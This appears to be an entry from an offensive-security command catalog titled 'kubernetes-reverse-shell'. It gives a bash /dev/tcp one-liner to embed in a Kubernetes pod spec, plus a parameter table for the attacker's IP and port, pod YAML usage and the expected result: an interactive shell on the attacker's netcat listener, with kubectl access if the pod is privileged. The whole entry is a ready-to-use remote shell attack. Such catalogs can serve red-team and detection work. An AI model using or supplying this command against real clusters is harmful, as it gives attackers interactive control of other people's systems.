---
id: uuid8
data: '["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]'
tags:
  - reverse-shell
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - Kubernetes
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.211Z'
verified: false
validated: true
submitted: true
---
# kubernetes-reverse-shell

## Command

```bash
["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
```

## Description

This command, embedded in a Kubernetes pod spec, initiates a reverse bash shell connecting to the attacker's listener, providing interactive access with the pod's privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| IP | Attacker's IP (e.g., 10.0.0.1) | Yes |
| Port | Listener port (e.g., 4242) | Yes |

## Examples

### Basic Usage

In pod YAML:
```yaml
command: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
```

### Advanced Usage

Adapt IP/port for different listeners.

## Expected Output

Interactive bash prompt on attacker's nc listener, allowing kubectl commands if privileged.

## Related

- [[procedures/Execute-Reverse-Shell-from-Privileged-Pod]]
